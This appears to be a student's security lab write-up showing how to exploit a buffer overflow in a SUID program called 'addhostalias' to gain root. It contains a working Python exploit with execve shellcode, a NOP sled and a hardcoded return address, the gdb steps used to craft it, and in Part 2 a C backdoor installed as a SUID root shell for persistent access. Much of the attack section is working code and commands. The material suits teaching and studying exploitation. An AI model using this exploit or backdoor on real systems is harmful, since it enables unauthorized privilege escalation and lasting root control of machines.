## Lab 2 - Buffer Overrun

### Part 1 : Gaining root access

#### How does it work ?

In order to gain root access to this machine, we are going to use the `addhostalias` executable file, which seems to be vulnerable to buffer overruns. In order to exploit this, we are going to go through several steps :
- analyse the vulnerability in the code.
- use gdb to analyse how the program behaves according to the arguments that we give.
- find a way to exploit it. In our case, we will use Python which allows us to have our root shell more easily. Since it is a high level language, we can focus on the content of our malicious code instead of how to generate it.



First of all, let's have a brief explanation of how the stack works in this type of program. In order to maintain consistency during program execution, Linux OS stores everything that is necessary for the program to work in memory. This means it can push data in a stack, but also store addresses that point to other memory locations(for example when a function call is performed). The schema below tries to summarize the memory layout:

```
       0xffffffff

   4 bytes (32bits OS)
< --------------------->


 ----------------------
|   RETURN ADDRESS      | 
 ----------------------
|    BASE POINTER      |
 ---------------------- 
|                      |
|                      |
|                      |
|                      |
|                      |
|       STACK          |
|    (256 bytes)       |
|                      |
|                      |
|                      |
 ----------------------

       0x00000000

```


```c

#include <stdio.h>
#include <stdlib.h>
 
 
#define HOSTNAMELEN 256
#define IPADDR      1
#define HOSTNAME    2
#define ALIAS       3
 
#define HOSTFILE "/etc/hosts"
 
 
void add_alias(char *ip, char *hostname, char *alias) {
  char formatbuffer[256];
  FILE *file;
 
  sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias); // sprintf doesn't check if formatbuffer variable can be bound into 256 bytes, we are going to exploit this section
 
  file = fopen(HOSTFILE, "a");
  if (file == NULL) {
    perror("fopen");
    exit(EXIT_FAILURE);
  }
 
  fprintf(file, formatbuffer);
  if (fclose(file) != 0) {
    perror("close");
    exit(EXIT_FAILURE);
  }
}
 
 
int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s ipaddress hostname alias \n", argv[0]);
    exit(EXIT_FAILURE);
  }
 
  add_alias(argv[IPADDR], argv[HOSTNAME], argv[ALIAS]);
  return(0);
}

```

Then, our goal is to craft a python exploit that will fill the buffer with malicious code and overwrite the return address: 
- We have to inject inside the buffer the 256 bytes necessary to fully occupy it + 8 bytes to overwrite the base pointer and the return address.

```python
# run a shell on local machine
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')


# NOP signal, tells the CPU to go to the next instruction
nop = '\x90'
nops = nop*181

# estimated area of the end of the stack
nop_adress = '\x10\xf9\xff\xbf'

# 181 (NOPs) + 75 (Shellcode) + 2 (separators between addhostalias arguments) + 2 (last 2 bytes for base pointer occupied by 2 NOPs)+ 4 (return address) = 264 bytes of data (instead of 256, so it will overwrite the base pointer and the return address)
print nops+shellcode,nop*2,nop_adress


```

#### How did we create our exploit ?


![How to use GDB to craft our exploit](/assets/lab2/gdb-demo.png)

- `gdb --args addhostalias $(python r00t.py)` entering debug mode for our program.
- `(gdb) break fopen` place a break point to stop the program's execution when fopen function is called. In our case it will stop just after the buffer has been written to memory.
- `(gdb) run` run the program until it finishes or when a breakpoint is reached.
- `(gdb) x/100x $sp` display 100 current words in our memory where the stack pointer is located. This allows us to analyse the current stack state once our buffer is written with our three arguments.

```

 ----------------------
|   RETURN ADDRESS      | <------- now redirects approximately to the end of the stack (in the NOP slide inserted inside the buffer)
 ----------------------
|    BASE POINTER      | <------- not important in our case, but it is now overwritten with NOPs
 ---------------------- 
|                      |
|       MALICIOUS      |
|         CODE         |
|                      |
|         ...          |
|         NOP          |
|         NOP          |
|         NOP          |
 ----------------------

```

The SUID bit is set, so the program is vulnerable. When a user runs this program, his EUID (effective user id) becomes the same as root. This is necessary to have the possibility to edit the /etc/hosts file, which root only has the right to write to. In this case, The SUID bit is mandatory in order for `addhostalias` to work properly.

`addhostalias $(python r00t.py)`

Allows to gain root access using our python script.

The SUID bit configured on `addhostalias` gives us the opportunity to execute the commands described in the shellcode with the necessary root permissions. These instructions allow us to launch a root shell after the execution of the program. If we didn't set the real used id and the real group id as the effective user id (root) during the execution of the program, we would lose our root permissions before entering the called shell and have access to a normal user's shell instead.


### Part 2 : Create a Backdoor

Once we have access to a root shell, we need to create a backdoor in order to be able to log as root easily the next time we need to.
To do that, all we need is to create a c file called `backdoor.c`for exemple:

```c 
#include<stdlib.h>
main () {
setuid(0);
system("/bin/bash");
}
```

Then we need to compile it with gcc: `gcc -o backdoor backdoor.c`.
Finally, we have to set the suid bit: `chmod u+s backdoor` and verify that group and others have the execute permission.

Now, when we execute`./backdoor` with the user dvader, we gain access to a root shell.
